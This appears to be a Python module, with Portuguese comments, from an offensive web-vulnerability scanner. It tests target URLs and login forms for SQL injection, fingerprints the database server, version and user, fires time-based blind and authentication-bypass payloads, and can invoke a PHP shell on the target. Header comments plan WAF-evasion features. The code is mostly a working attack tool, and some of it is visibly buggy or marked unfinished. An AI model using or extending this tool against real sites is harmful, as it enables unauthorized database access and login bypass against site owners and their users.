# !/usr/bin/env python3
## começar com a captação de exxecção da intrruupção do usuário, CTRL+C
## criar a funão responsáve pra filtrar o atributo id do aalvo passada
## caso não seja enconrado, procure por campos e formulário
## emplementar mecanismos de seguramça na parte do usuário do programa, mecanismos de burlação de WAF, entre outras


## começar por testes de injeção sql baseada no tempo... criar um jit
import os
from datetime import datetime
from core.config import INITIAL_COUNT_VALUE, INITIAL_FORM_COUNT_VALUE


def _sqlInjection(target_url, response, cookie, _shell):

    try:
        try:
            from core import colors as color
            from core.utils import avaregeTime
            from core.config import AVARAGE_TIME_BASED_SQLI
            from core.config import DEFAULT_SQLI_TIME_BASED_TIME
        #  from core.config import SQLI_BLIND_TIME_BASED_SUCCED_COUNT
        #  from core.config import FIND_NUMBER_OF_COLLUM_IN_TABLE
            from bs4 import BeautifulSoup
            from core.utils import urlExplode
            from core.utils import exitTheProgram
            from mode.plugin.dbfingerprint import _dbFingerprint
            from mode.plugin.dbfingerprint import _serverVersion
            from mode.plugin.dbfingerprint import _getDatabaseNameU
            from mode.plugin.connection import _connectMYSQL
            from mode.plugin.connection import _socket
            from mode.plugin.php_shell import shell

            import re
            import requests
            
            
            print("["+color.green+"!"+color.end+"]"+color.end+"["+color.admin_side, datetime.now(), color.end+"]  Modo de"+color.orange+" deteção injeção sql"+ color.end+" passada para o alvo "+color.orange+target_url+color.end)
            print("["+color.green+"~"+color.end+"]["+color.admin_side, datetime.now(), color.end+"]  Testando a estabilidade da conexão, pode levar alguns minutos...")
            
            if(avaregeTime(target_url) >= AVARAGE_TIME_BASED_SQLI):
                print(color.end+"[!][", datetime.now(),"]  Aviso: A sua conexão parece estar instável, recomenda-se que se tenha uma conexão estável."+color.end, end='')
                ## ainda mostro o jitter aqui só pra comparar com o tempo de teste de injeções sql
                user_option = str(input(" Deseja continuar? (sim/nao): "))
                if user_option.lower() == 'sim':
                    pass
                elif user_option.lower() == 'nao':
                    print(color.orange+"[!][", datetime.now(),"]  Aviso: Terminando o teste..."+color.end, end='')
                    exitTheProgram()
                else:
                    print(color.red+"[!][", datetime.now(),"] Erro: Entrada inválida"+ color.end)
                    exitTheProgram()
            else:
                print("["+color.green+"+"+color.end+"]["+color.admin_side, datetime.now(), color.end+"]  Conexão estável ")
                pass 
            ## filtrando a variável url id do alvo passado
            try:
                print("["+color.green+"~"+color.end+"]["+color.admin_side, datetime.now(), color.end+"]  Procurando por variáveis URL...", end='') 
                para = re.compile('(=)\w+')
                if para.search(target_url):
                        try:
                            ## tentando extrai informaçẽs do servidor com socket
                            splited_para = para.search(target_url).group()
                            exploited_target_url = target_url.replace(splited_para, splited_para+"'")
                            requesicao = requests.head(url=exploited_target_url)
                            requesicao = requests.post(url=exploited_target_url)
                            
                            '''
                                fazendo um fingerprint no servidor
                            '''
                            
                            print("\n["+color.green+"~"+color.end+"]["+color.admin_side, datetime.now(), color.end+"]  Testando "+color.cian+" MYSQLi inferencial(CEGA) ORDER QUERY TECHNIQUE, pode levar alguns minutos..."+color.end)
                            current_table_cullumns_number = _dbFingerprint(target_url)
                            
                            print("["+color.green+"~"+color.end+"]["+color.admin_side, datetime.now(), color.end+"]  Testando "+color.cian+" MYSQLi inferencial(CEGA) FINGERPRINT TECHINQUE, pode levar alguns minutos..."+color.end)
                            server_fingerprint = _serverVersion(target_url, current_table_cullumns_number)
                            ## veriffica pra caso haja valores no array do fingerprint do servidor
                            if server_fingerprint:
                                pass
                            else:
                                server_fingerprint[1] = "Não encontrado";
                                server_fingerprint[2] = "Não encontrado";

                            print("["+color.green+"~"+color.end+"]["+color.admin_side, datetime.now(), color.end+"]  Testando "+color.cian+" MYSQLi inferencial(CEGA) DATABASE USER FINGERPRINT TECHINQUE..."+color.end)
                            database_user_fingerprint = _getDatabaseNameU(target_url, current_table_cullumns_number)
                            if '2' in database_user_fingerprint.keys():
                                pass
                            else:
                                database_user_fingerprint[2] = "Não encontrado"           
                            print("["+color.green+"~"+color.end+"]["+color.admin_side, datetime.now(), color.end+"]  Identificando o SGBD com "+color.cian+" SQLI INFERENCIAL(CEGA)"+color.end)
                            if 'mysql' in requesicao.text.lower():
                                ## mostra o relatório em relação ao fingerprint do servidor
                                print("\n ----------")
                                header_list = ['Server', 'Date', 'Via', 'X-Powered-By', 'X-Contry-Code', 'Sec-Ch-Ua-Platform']
                                for header_perc in header_list:
                                    try:
                                        result = requesicao.headers[header_perc]
                                        print("\t%s: %s  " % (header_perc, result))
                                    except Exception as error:
                                        print("\t%s : não encontrado" % header_perc)
                                print("\tSGBD alvo: MYSQL")        
                                print("\tVersão do SGBD: %s" %server_fingerprint[1])
                                print("\tSistema backend (OS) do SGBD: %s" %server_fingerprint[2])
                                print("\tNome do usuário do banco de dados: %s" %database_user_fingerprint[2])
                                print("\tNome do banco de dados: %s" %database_user_fingerprint[1])
#                               print("\tQuantidade de colunas na tabela actual: %s "%current_table_cullumns_number)
                                print(" ----------")
                                ## termino do relatório
                                
                                database_user_fingerprint[2] = database_user_fingerprint[2].split('@' )
                                
                               
                                '''
                                
                                ## tentando connecctar ao banco de dados ainda nã está funcionanndo:
                                mysql_server_ip =  _socket(target_url)
                                conexao = _connectMYSQL(mysql_server_ip, database_user_fingerprint[2][0], '')
                                ## criar uma condição aqui, pra caso o usuário desejar apenas testar se o alvo é vulnerável ou não
                                
                                '''
                                
                                
                                print("["+color.green+"~"+color.end+"]["+color.admin_side, datetime.now(), color.end+"]  Testando "+color.cian+" MYSQLi inferencial(CEGA) baseada no tempo"+color.end)
                                
                                with open('./mode/payload/mysql/blind_payloads_time_based', 'r') as blind_time_based_sqli:
                                    for lines in blind_time_based_sqli:
                                        response_time = int(avaregeTime(exploited_target_url))
                                        if avaregeTime(exploited_target_url) >= DEFAULT_SQLI_TIME_BASED_TIME:
                                            print("["+color.green+"+"+color.end+"]["+color.admin_side, datetime.now(), color.end+"]["+color.green+"Viável"+color.end+"]    MYSQLi"+ color.cian, lines+color.end, end='')
                                        else:
                                            print("["+color.red+"-"+color.end+"]["+color.admin_side, datetime.now(), color.end+"]["+color.red+"Bloqueado"+color.end+"] MYSQLi"+ color.cian, lines+color.end, end='')
                                #print("["+color.green+"~"+color.end+"] Testando "+color.cian+" MYSQLi inferencial(CEGA) baseada no tempo"+color.end)
                                '''
                                
                                Falta mostrar o relatório aqui
                                
                                '''
        
                            elif 'native client' in requesicao.text.lower():
                                print("["+color.green+"~"+color.end+"]["+color.admin_side, datetime.now(), color.end+"] SGBD identificado: "+color.cian+"[MSSQL]")
                                print("["+color.green+"+"+color.end+"]["+color.admin_side, datetime.now(), color.end+"] Testando "+color.cian+" MSSQL inferencial(CEGA) baseada no tempo"+color.end)
                                with open("./mode/payload/mssql/blind_payloads_time_based" , 'r') as blind_payloads_time_based:
                                    for lines in blind_payloads_time_based:
                                        print("["+color.end+"*"+color.end+"] [Testando]  MSSQL "+color.cian+lines+color.end, end='')
                                        exploited_target_url = target_url.replace(splited_para, "="+lines)
                                        response_time = int(avaregeTime(exploited_target_url))
                                        if avaregeTime(exploited_target_url) >= DEFAULT_SQLI_TIME_BASED_TIME:
                                            print("["+color.green+"+"+color.end+"]["+color.admin_side, datetime.now(), color.end+"] ["+color.admin_side+"Viável"+color.end+"]    MSSQL"+ color.cian, lines+color.end, end='')
                                        else:
                                            print("["+color.red+"-"+color.end+"]["+color.admin_side, datetime.now(), color.end+"] ["+color.red+"Bloqueado"+color.end+"] MYSQLi"+ color.cian, lines+color.end, end='')
                                            
                            elif 'syntax error' in requesicao.text.lower():
                                print("["+color.green+"+"+color.end+"]["+color.admin_side, datetime.now(), color.end+"] SGBD identificado: "+color.cian+"[POSTGRES]")
                                print("["+color.green+"~"+color.end+"]["+color.admin_side, datetime.now(), color.end+"] Testando "+color.cian+" POSTGRES inferencial(CEGA) baseada no tempo"+color.end)
                                '''
                                ainda sem os payload ideias pra o postgres server
                                '''
                            elif 'ORA' in requesicao.text.lower():
                                print("["+color.green+"*"+color.end+"]["+color.admin_side, datetime.now(), color.end+"] SGBD identificado: "+color.cian+"[ORACLE]")
                                '''
                                ainda sem os payload ideias pra o postgres server
                                '''
                            else:
                                
                                ### ver mauito bem essa parte
                                print(color.info_1+color.red_0+color.info_2+"[", datetime.now(),"]"+color.orange+"  Aviso: SGBD não encontrada, o alvo deve estar sendo protegido por mecanismos de segurança, tal como WAF."+color.end, end='')
                                user_option = str(input(' Deseja continuar o teste? (sim/nao):'))
                                if user_option.lower() == 'sim':
                                    pass ## continua o scaneamento fazendo outros testes aqui
                                elif user_option.lower() == 'nao':
                                    print(color.info_1+color.red_0+color.info_2+"[", datetime.now(),"]  Aviso:"+color.end)
                                    exitTheProgram()
                                else:
                                    print(color.red+"[!][", datetime.now(),"]  Erro: Opção inválid"+color.end)
                                    exitTheProgram()
                        except FileNotFoundError as e:
                            e = str(e)
                            print(color.red+"[!][", datetime.now(),"] Erro: arquivo ", e[38:], " não foi encontrado"+color.end)
                            exitTheProgram()
                else:
                    
                    '''
                    Faz o teste sqli nos campos de formulários filtrados 👇👇👇👇👇👇👇👇👇
                    '''
                    print("\n"+color.info_1+color.red_0+color.info_2+"[", datetime.now(),"]  Aviso: variáveis URL não encontrado. Será usada campos inputs..."+color.end)
                    print("["+color.green+"+"+color.end+"]["+color.admin_side, datetime.now(), color.end+"]  Procurando por formulários..."+color.end)
                    
                    main_requesition = requests.get(url=target_url)
                    main_requesition_parsed = BeautifulSoup(main_requesition.content, 'html.parser')
    
                    forms = main_requesition_parsed.find_all('form')
                    
                    form_quant = -1
                    array_form = {}
                    input_dic  = {}
                    validation_page = {} 
                    succed_payloads = []
                    
                    url_exploded = urlExplode(target_url)
                    ## percorre o objecto Soup do formulário, guardando ele no array_form com índices inteiros
                    for form_perc in forms:
                        form_quant += 1
                        if 'action' in form_perc.attrs:
                            validation_page[form_quant] = form_perc['action']
                            
                        array_form[form_quant] = form_perc     
                    print("["+color.green+"+"+color.end+"]"+color.end+"["+color.admin_side, datetime.now(), color.end+"]  Foi encontrado [0 - (%s)] formulários." % (form_quant - 1 ), end='')
                    if form_quant == INITIAL_COUNT_VALUE:
                        form_quant = 1  
                        user_option = 0
                    else:
                        try:
                            user_option = int(input(" Qual a posição do formulário que desejas testar?: "))
                        except ValueError as e:
                            print(color.red+"[!][", datetime.now(), "]  Erro:  Valor inválido"+color.end)
                            exitTheProgram()()
                        if user_option > form_quant or user_option < 0:
                            print(color.red+"[!][", datetime.now(), "]  Erro: Quantidade inválida."+color.end)
                            exitTheProgram()
                        else:
                            pass
                    for user_option_perc in range(INITIAL_FORM_COUNT_VALUE):
                                ## monta a url de validação dos dados
                                post_target_url = url_exploded[0]+'//'+url_exploded[2]+'/'+validation_page[user_option]
                                ## avança na execução conforme instruido pelo o usuário
                                print("\n["+color.green+"+"+color.end+"]["+color.admin_side, datetime.now(), color.end+"] " +color.end+" Filtrando os Possíveis campos vulneráveis...."+color.end+ " no formulário na posição "+color.cian,user_option,color.end)
                                input_tag = array_form[user_option].find_all({'input'})
                                ## testa a existencia da interação da página de login, caso não seja passada, solicite que se passe
                                if response:
                                    pass
                                else:
                                    print(color.red+"[!]["+color.red, datetime.now(),"]  Erro: Não foi passada a mensagem de interação da página via parâmetro "+color.cian+" --response"+color.end)
                                    exitTheProgram()
                                    
                                print("["+color.green+"+"+color.end+"]["+color.admin_side, datetime.now(), color.end+"]  Testando "+color.cian+" Injeção inferencial(CEGA) BYPASS AUTH BOOLEAN "+color.end)
                                with open ('./mode/payload/bypass_auth_payloads_sqli', 'r') as bypass_auth_payloads_sqli:
                                    for lines in bypass_auth_payloads_sqli:
                                        for input_tag_perc in input_tag:
                                            if 'type' in input_tag_perc.attrs:
                                                if 'checkbox' in input_tag_perc.attrs['type']:
                                                    pass
                                                elif 'name' in input_tag_perc.attrs:
                                                    input_dic[input_tag_perc.attrs['name']] = lines
                                        main_requesition = requests.post(url=post_target_url, data=input_dic)
                                        '''
                                        alguns servidores mal configuradas, ou páginas, não enviam o cabeçalho http Set-cookie logo na primeira requisão
                                        a página de login, só depois de usuário estiver aunteticado, podemos nos aproveitar dessa falha e testarmos a autenti-
                                        cidade dos payloads
                                        '''
                                        if 'Set-Cookie' in main_requesition.headers:
                                            ## ver bem essa lógica... não funcionando ainda em condições
                                            if response not in main_requesition.text.lower(): 
                                                print("["+color.green+"+"+color.end+"]["+color.admin_side, datetime.now(), color.end+"]["+color.admin_side+"Viável"+color.end+"]  MYSQLi BYPASS AUTH BOOLEAN "+ color.cian, lines+color.end, end='')
                                                succed_payloads.append(lines)
                                                break
                                            else:
                                                print("["+color.red+"-"+color.end+"]["+color.admin_side, datetime.now(), color.end+"]["+color.red+"Bloqueado"+color.end+"] MYSQLi BYPASS AUTH BOOLEAN"+ color.cian, lines+color.end, end='')
                                        else:
                                            ## ver bem essa lógica... não funcionando ainda em condições
                                            if response not in main_requesition.text.lower() and lines not in main_requesition.text.lower():
                                                print("["+color.green+"+"+color.end+"]["+color.admin_side, datetime.now(), color.end+"]["+color.green+"Viável"+color.end+"]  MYSQLi BYPASS AUTH BOOLEAN "+ color.cian, lines+color.end, end='')
                                                succed_payloads.append(lines)
                                                break
                                            else:
                                                print("["+color.red+"-"+color.end+"]["+color.admin_side, datetime.now(), color.end+"]["+color.red+"Bloqueado"+color.end+"] MYSQLi BYPASS AUTH BOOLEAN"+ color.cian, lines+color.end, end='')
                                '''
                                secção de relatórios de teste
                                '''          
                                print("\n O Web spider detetou os seguintes pontos de injeção no alvo:")
                                for succed_payloads_lines in succed_payloads:
                                    print("\t Título: MYSQLi BYPASS AUTH BOOLEAN :: Payload: %s" %succed_payloads_lines, end='')
                                    for index, value in input_dic.items():
                                        print("\t Variávei url: %s"%index)
                ## Chamando o shell php
                if _shell:
                    shell(target_url)
                    
                    ## ainda não funcioando em condição.....................
            except requests.exceptions.RequestException as e:
                print('\n'+color.red+"[!][", datetime.now(),"] Erro: alvo Inacessível, verifique a sua ligação à internet ou contacte o Web master."+color.end)
                exitTheProgram()
        except ImportError as e:
            print(color.red+"[!][", datetime.now(),"] Erro: Falha na importação dos Módulos."+color.end)
            exitTheProgram()
    except KeyboardInterrupt as e:
        print(color.red+"[!][", datetime.now(),"] Erro: Interrupção pela parte do usuário"+color.end)
        exitTheProgram()